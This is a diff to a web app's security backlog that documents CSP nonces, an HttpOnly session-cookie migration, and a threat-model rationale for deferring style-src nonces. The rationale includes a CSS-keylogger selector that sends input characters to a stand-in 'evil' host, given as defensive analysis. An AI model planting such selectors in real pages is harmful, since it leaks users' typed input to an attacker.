@@ -63,6 +63,26 @@ Things an attacker could exploit against the live site today.
 - [x] Tighten CSP script-src to nonces (drop `'unsafe-inline'`). (Shipped 2026-05-17 — per-request nonce generated via `before_request` (`secrets.token_urlsafe(16)`), exposed to templates as `csp_nonce` Jinja variable, stamped onto the 3 inline `<script>` blocks in `index.html` (Sentry init, early-theme paint, Google globals). External scripts loaded by `src=` continue to match the URL allowlist without nonces. Tests pin three invariants: no `'unsafe-inline'` on script-src, every inline `<script>` tag carries a nonce matching the CSP header, and nonces rotate per-request. Inline `style="..."` cleanup still queued — separate bigger refactor paired with §3.1.)
 - [x] Plan migration of JWT into an `HttpOnly; Secure; SameSite=Lax` cookie. (Shipped 2026-05-17. JWT now lives in a `gg_session` cookie set by `/api/auth/google` — `HttpOnly` (JS can't read), `SameSite=Lax` (CSRF mitigation), `Secure` auto-flagged via `X-Forwarded-Proto` so PA's HTTPS-terminating reverse proxy still gets it. `_extract_token()` tries cookie first then falls back to the `Authorization: Bearer` header so (a) the deploy doesn't force-log-out users with a stale localStorage token, (b) pytest fixtures + the Playwright `getAuthForApi` helper keep working, (c) potential future mobile-shell clients can still auth without a cookie jar. `clear_auth_cookie` runs on `/api/auth/logout` alongside the existing `bump_user_jti` so the browser stops sending the (now-invalid) cookie. Frontend `apiFetch` switched to `credentials: 'include'`, stopped reading the legacy `gg_auth_token` from localStorage, and `clearAuthToken` is now purely the client-side cleanup pair (legacy key removal + SW cache wipe). 6 new pytest cases pin the contract (cookie set, Secure-via-proxy detection, cookie-alone auth, logout wipes, Bearer back-compat, cookie-wins-when-both); 3 new Playwright cases pin the real-browser behaviour (`gg_session` lands in the jar with HttpOnly=true, isn't visible to `document.cookie`, alone satisfies require_auth, logout actually deletes from the jar).
 
+#### 0.4 follow-up — style-src nonces (deferred, with rationale)
+
+🟢 **L** · scope: 1,422 inline-style sites across 50+ files (top offenders: `pages/settlement/legacyRender.ts` 141, `pages/ai/AI.tsx` 141, `modals.ts` 88, `pages/home/tripMediaModals.ts` 86)
+
+Style-src still keeps `'unsafe-inline'` because the codebase has hundreds of inline `style="..."` attributes spread across imperative template-string renderers AND React JSX. Three options ranked:
+
+1. **Extract every site to CSS classes** — the "real" fix. Multi-week refactor across page rendering, modals, and JSX styling. Each site needs review (per-trip color? user-input substitution? theme-token interpolation?). Risk of visual regressions across the entire app.
+2. **`'unsafe-hashes'` + per-style SHA-256 hashes** — brittle; every distinct style string needs a hash entry. Hash list grows with every commit that adds an inline style. Maintenance burden roughly cancels the security win.
+3. **Status quo** — keep `'unsafe-inline'` on style-src; accept the residual CSS-injection threat.
+
+**Threat-model analysis post-§0.4-v2 cookie migration (2026-05-17):**
+With the JWT in an `HttpOnly` cookie + script-src nonces shipped, an XSS that lands can no longer exfil the session token. Style-src `'unsafe-inline'` lets a CSS injection do:
+
+- CSS keylogger via attribute selectors (`input[value^="a"] { background: url(//evil/?a) }`) — slow, character-by-character, AND blocked at the network step by the `connect-src` allowlist (the exfil URL must be on the allowlist, which only includes our own backends + a handful of named third-parties)
+- Clickjacking-style visual overlays — real but localised to in-page mischief; can't talk to the network
+
+The CSP `connect-src` allowlist + the cookie HttpOnly flag together neuter the most dangerous payloads. The remaining surface (clickjacking overlay) is in-page-only.
+
+**Decision: defer indefinitely.** Re-evaluate if (a) a CSS-injection vulnerability surfaces in practice, (b) the §3.1 inline-style cleanup makes meaningful organic progress (it's already chipping at the count as components migrate to React + per-page CSS chunks), or (c) we adopt a stricter security stance for an external compliance reason. The remaining `'unsafe-inline'` on style-src is documented technical debt — not an unknown gap.
+
 ### 0.5 `/api/sync` rewrites _any_ expense by guessed ID
 
 🔴 **S** · `src/routes/data.py:168-180`
